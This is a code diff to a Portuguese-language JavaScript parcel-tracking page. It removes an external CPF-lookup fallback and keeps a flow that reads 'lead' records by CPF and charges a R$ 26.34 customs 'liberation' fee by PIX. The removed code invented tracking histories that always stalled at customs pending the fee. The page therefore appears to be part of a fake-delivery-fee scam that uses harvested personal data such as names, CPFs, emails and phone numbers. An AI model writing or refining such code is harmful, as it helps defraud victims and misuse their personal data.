@@ -1,28 +1,25 @@
 /**
- * Sistema de rastreamento real baseado em dados do banco
- * SEM SIMULAÇÕES - DADOS REAIS DO SUPABASE
+ * Sistema de rastreamento baseado APENAS em dados do banco
+ * SEM API DE CPF - APENAS DADOS DO SUPABASE
  */
-import { DataService } from '../utils/data-service.js';
+import { DatabaseService } from '../services/database.js';
 import { UIHelpers } from '../utils/ui-helpers.js';
 import { CPFValidator } from '../utils/cpf-validator.js';
 import { ZentraPayService } from '../services/zentra-pay.js';
-import { DatabaseService } from '../services/database.js';
 
 export class TrackingSystem {
     constructor() {
         this.currentCPF = null;
         this.trackingData = null;
-        this.userData = null;
         this.leadData = null; // Dados do banco
-        this.dataService = new DataService();
-        this.zentraPayService = new ZentraPayService();
         this.dbService = new DatabaseService();
+        this.zentraPayService = new ZentraPayService();
         this.isInitialized = false;
         this.pixData = null;
         this.paymentErrorShown = false;
         this.paymentRetryCount = 0;
         
-        console.log('TrackingSystem inicializado com dados reais do banco');
+        console.log('TrackingSystem inicializado - APENAS DADOS DO BANCO');
         this.initWhenReady();
     }
 
@@ -42,7 +39,7 @@ export class TrackingSystem {
     init() {
         if (this.isInitialized) return;
         
-        console.log('Inicializando sistema de rastreamento real...');
+        console.log('Inicializando sistema de rastreamento baseado no banco...');
         
         try {
             this.setupEventListeners();
@@ -50,7 +47,7 @@ export class TrackingSystem {
             this.clearOldData();
             this.validateZentraPaySetup();
             this.isInitialized = true;
-            console.log('Sistema de rastreamento real inicializado com sucesso');
+            console.log('Sistema de rastreamento inicializado com sucesso');
         } catch (error) {
             console.error('Erro na inicialização:', error);
             setTimeout(() => {
@@ -243,7 +240,7 @@ export class TrackingSystem {
     }
 
     async handleTrackingSubmit() {
-        console.log('=== INICIANDO BUSCA REAL NO BANCO ===');
+        console.log('=== INICIANDO BUSCA APENAS NO BANCO ===');
         
         const cpfInput = document.getElementById('cpfInput');
         if (!cpfInput) {
@@ -264,7 +261,7 @@ export class TrackingSystem {
             return;
         }
 
-        console.log('CPF válido, iniciando busca real...');
+        console.log('CPF válido, buscando APENAS no banco...');
         UIHelpers.showLoadingNotification();
 
         const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
@@ -282,9 +279,9 @@ export class TrackingSystem {
             // Aguardar um pouco para mostrar o loading
             await new Promise(resolve => setTimeout(resolve, 1500));
 
-            console.log('🔍 ETAPA 1: Buscando no banco de dados...');
+            console.log('🔍 Buscando no banco de dados...');
             
-            // Buscar primeiro no banco de dados
+            // Buscar APENAS no banco de dados
             const dbResult = await this.dbService.getLeadByCPF(cleanCPF);
             
             if (dbResult.success && dbResult.data) {
@@ -293,14 +290,6 @@ export class TrackingSystem {
                 
                 this.leadData = dbResult.data;
                 this.currentCPF = cleanCPF;
-                
-                // Usar dados do banco
-                this.userData = {
-                    nome: this.leadData.nome_completo,
-                    cpf: this.leadData.cpf,
-                    nascimento: null,
-                    situacao: 'REGULAR'
-                };
                 
                 UIHelpers.closeLoadingNotification();
                 
@@ -321,41 +310,9 @@ export class TrackingSystem {
                 }, 1500);
                 
             } else {
-                console.log('❌ CPF não encontrado no banco, buscando na API...');
-                
-                // Buscar na API de CPF
-                const apiData = await this.dataService.fetchCPFData(cleanCPF);
-                
-                if (apiData && apiData.DADOS) {
-                    console.log('✅ Dados encontrados na API:', apiData.DADOS);
-                    
-                    this.currentCPF = cleanCPF;
-                    this.userData = apiData.DADOS;
-                    this.leadData = null; // Não há dados no banco
-                    
-                    UIHelpers.closeLoadingNotification();
-                    
-                    console.log('📋 Exibindo dados da API...');
-                    this.displayOrderDetailsFromAPI();
-                    this.generateAPITrackingData();
-                    this.displayTrackingResults();
-                    this.saveTrackingData();
-                    
-                    const orderDetails = document.getElementById('orderDetails');
-                    if (orderDetails) {
-                        UIHelpers.scrollToElement(orderDetails, 100);
-                    }
-                    
-                    // Para dados da API, sempre mostrar etapa de liberação
-                    setTimeout(() => {
-                        this.highlightLiberationButton();
-                    }, 1500);
-                    
-                } else {
-                    console.log('❌ CPF não encontrado');
-                    UIHelpers.closeLoadingNotification();
-                    UIHelpers.showError('CPF não encontrado. Tente novamente.');
-                }
+                console.log('❌ CPF não encontrado no banco');
+                UIHelpers.closeLoadingNotification();
+                UIHelpers.showError('CPF inexistente. Não encontramos sua encomenda.');
             }
             
         } catch (error) {
@@ -394,7 +351,7 @@ export class TrackingSystem {
         }
         this.updateElement('customerProduct', productName);
         
-        // Endereço completo
+        // Endereço completo formatado
         const fullAddress = this.leadData.endereco || 'Endereço não informado';
         this.updateElement('customerFullAddress', fullAddress);
         
@@ -403,32 +360,6 @@ export class TrackingSystem {
         console.log('📄 Nome completo:', this.leadData.nome_completo);
         console.log('📍 Endereço:', fullAddress);
         console.log('📦 Produto:', productName);
-        
-        this.showElement('orderDetails');
-        this.showElement('trackingResults');
-    }
-
-    displayOrderDetailsFromAPI() {
-        if (!this.userData) return;
-
-        console.log('📋 Exibindo dados da API de CPF');
-        
-        const customerName = this.getFirstAndLastName(this.userData.nome || 'Nome não encontrado');
-        const formattedCPF = CPFValidator.formatCPF(this.userData.cpf || '');
-        
-        // Dados básicos
-        this.updateElement('customerName', customerName);
-        this.updateElement('fullName', this.userData.nome || 'Nome não informado');
-        this.updateElement('formattedCpf', formattedCPF);
-        this.updateElement('customerNameStatus', customerName);
-        
-        // Para dados da API, campos em branco conforme solicitado
-        this.updateElement('customerProduct', '');
-        this.updateElement('customerFullAddress', '');
-        
-        console.log('✅ Interface atualizada com dados da API');
-        console.log('👤 Nome exibido:', customerName);
-        console.log('📄 Nome completo:', this.userData.nome);
         
         this.showElement('orderDetails');
         this.showElement('trackingResults');
@@ -471,40 +402,6 @@ export class TrackingSystem {
         console.log('✅ Dados de rastreamento gerados baseados no banco');
         console.log('📊 Etapa atual:', currentStage);
         console.log('💳 Status pagamento:', this.leadData.status_pagamento);
-    }
-
-    generateAPITrackingData() {
-        console.log('📦 Gerando dados de rastreamento para CPF da API');
-        
-        this.trackingData = {
-            cpf: this.userData.cpf,
-            currentStep: 11, // Sempre na etapa de liberação para dados da API
-            steps: [],
-            liberationPaid: false,
-            liberationDate: null,
-            deliveryAttempts: 0,
-            lastUpdate: new Date().toISOString()
-        };
-
-        const stageNames = this.getStageNames();
-        
-        // Gerar etapas até a alfândega (etapa 11)
-        for (let i = 1; i <= 11; i++) {
-            const stepDate = new Date();
-            stepDate.setHours(stepDate.getHours() - (11 - i));
-            
-            this.trackingData.steps.push({
-                id: i,
-                date: stepDate,
-                title: stageNames[i] || `Etapa ${i}`,
-                description: stageNames[i] || `Etapa ${i}`,
-                isChina: i >= 3 && i <= 7,
-                completed: true,
-                needsLiberation: i === 11 // Sempre precisa liberação para dados da API
-            });
-        }
-        
-        console.log('✅ Dados de rastreamento gerados para API (etapa de liberação)');
     }
 
     getStageNames() {
@@ -689,7 +586,7 @@ export class TrackingSystem {
     }
 
     async openLiberationModal() {
-        console.log('🚀 Iniciando processo de geração de PIX via Zentra Pay...');
+        console.log('🚀 Iniciando processo de geração de PIX com dados reais do banco...');
         UIHelpers.showLoadingNotification();
 
         try {
@@ -699,24 +596,31 @@ export class TrackingSystem {
 
             const value = window.valor_em_reais || 26.34;
             console.log('💰 Valor da transação:', `R$ ${value.toFixed(2)}`);
-            console.log('👤 Dados do usuário:', {
-                nome: this.userData.nome,
-                cpf: this.userData.cpf
+            
+            // Usar dados REAIS do banco
+            const userData = {
+                nome: this.leadData.nome_completo,
+                cpf: this.leadData.cpf,
+                email: this.leadData.email,
+                telefone: this.leadData.telefone
+            };
+            
+            console.log('👤 Dados REAIS do banco para pagamento:', {
+                nome: userData.nome,
+                cpf: userData.cpf,
+                email: userData.email,
+                telefone: userData.telefone
             });
 
-            console.log('📡 Enviando requisição para Zentra Pay...');
-            const pixResult = await this.zentraPayService.createPixTransaction(this.userData, value);
+            console.log('📡 Enviando requisição para Zentra Pay com dados reais...');
+            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);
 
             if (pixResult.success) {
-                console.log('🎉 PIX gerado com sucesso via API oficial Zentra Pay!');
+                console.log('🎉 PIX gerado com sucesso usando dados reais do banco!');
                 console.log('📋 Dados recebidos:', {
                     transactionId: pixResult.transactionId,
                     externalId: pixResult.externalId,
-                    pixPayload: pixResult.pixPayload,
-                    email: pixResult.email,
-                    telefone: pixResult.telefone,
-                    paymentMethod: pixResult.paymentMethod,
-                    valor: pixResult.valor
+                    pixPayload: pixResult.pixPayload
                 });
 
                 this.pixData = pixResult;
@@ -732,7 +636,7 @@ export class TrackingSystem {
                 throw new Error(pixResult.error || 'Erro desconhecido ao gerar PIX');
             }
         } catch (error) {
-            console.error('💥 Erro ao gerar PIX via Zentra Pay:', error);
+            console.error('💥 Erro ao gerar PIX:', error);
             UIHelpers.closeLoadingNotification();
             UIHelpers.showError(`Erro ao gerar PIX: ${error.message}`);
             
@@ -825,15 +729,12 @@ export class TrackingSystem {
             qrCodeImg.src = qrCodeUrl;
             qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
             console.log('✅ QR Code atualizado com dados reais da API oficial');
-            console.log('🔗 URL do QR Code:', qrCodeUrl);
         }
 
         const pixInput = document.getElementById('pixCodeModal');
         if (pixInput && this.pixData.pixPayload) {
             pixInput.value = this.pixData.pixPayload;
             console.log('✅ Código PIX Copia e Cola atualizado com dados reais da API oficial');
-            console.log('📋 PIX Payload Real:', this.pixData.pixPayload);
-            console.log('📏 Tamanho do payload:', this.pixData.pixPayload.length, 'caracteres');
         }
 
         const modal = document.getElementById('liberationModal');
@@ -848,9 +749,6 @@ export class TrackingSystem {
         }
 
         console.log('🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!');
-        console.log('💳 Transação ID:', this.pixData.transactionId);
-        console.log('🔢 External ID:', this.pixData.externalId);
-        console.log('💰 Valor:', `R$ ${this.pixData.valor.toFixed(2)}`);
     }
 
     addPaymentSimulationButton() {
@@ -929,7 +827,7 @@ export class TrackingSystem {
             this.trackingData.liberationPaid = true;
         }
 
-        // Atualizar no banco se for um lead do banco
+        // Atualizar no banco
         if (this.leadData) {
             await this.updatePaymentStatusInDatabase('pago');
         }
